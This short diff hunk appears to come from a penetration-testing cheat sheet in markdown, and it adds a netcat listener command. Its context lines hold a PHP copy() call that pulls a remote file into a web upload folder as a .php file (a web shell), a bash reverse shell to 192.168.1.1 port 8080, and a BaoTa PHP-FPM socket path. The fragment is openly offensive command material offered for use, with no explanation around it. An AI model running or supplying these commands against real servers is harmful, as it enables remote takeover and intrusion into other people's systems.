@@ -19,6 +19,9 @@ echo copy("https://a.mxxxx.com/12345.txt","/home/www/blog/upload/xxx.php");
 bash -i >& /dev/tcp/192.168.1.1/8080 0>&1
 ```
 ```Bash
+nc -lvvp 47077
+```
+```Bash
 //宝塔FPM
 /tmp/php-cgi-56.sock
 ```
